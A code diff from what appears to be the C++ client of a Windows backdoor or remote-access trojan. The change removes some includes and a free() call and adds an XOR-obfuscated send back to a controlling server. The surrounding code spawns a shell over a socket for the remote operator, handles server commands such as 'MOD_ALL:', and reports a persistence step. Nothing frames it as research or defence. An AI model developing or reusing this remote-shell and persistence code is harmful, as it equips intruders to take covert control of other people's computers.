@@ -1,12 +1,11 @@
+//#define WIN32_LEAN_AND_MEAN
+
 #include "../inc/Connexion.h"
 #include "../inc/common.h"
 #include "../inc/Persistence.h"
 #include "../inc/other.h"
 #include "../inc/Exec.h"
 
-#include <iostream>
-#include <winsock2.h>
-#include <windows.h> //sleep
 
 using namespace std;
 
@@ -119,7 +118,6 @@ int Connexion::main(bool is_admin, string path_prog)
                     Exec().spawnSHELL(sock_client,prog);
                 }
 
-                free(prog);
             }
             else if(command.substr(0,8)=="MOD_ALL:")
             {
@@ -140,6 +138,8 @@ int Connexion::main(bool is_admin, string path_prog)
                     cout << "[+] Persi ok " << endl;
                 }
                 cout << "send " << endl;
+                int satt = send(sock_client , XOREncryption("\r\n").c_str() ,2 ,0);
+                cout << "LL:" << satt << endl;
                 //FAUX sendSafe("\r\n"); //allows to send a confirmation to the server 
             }
             else
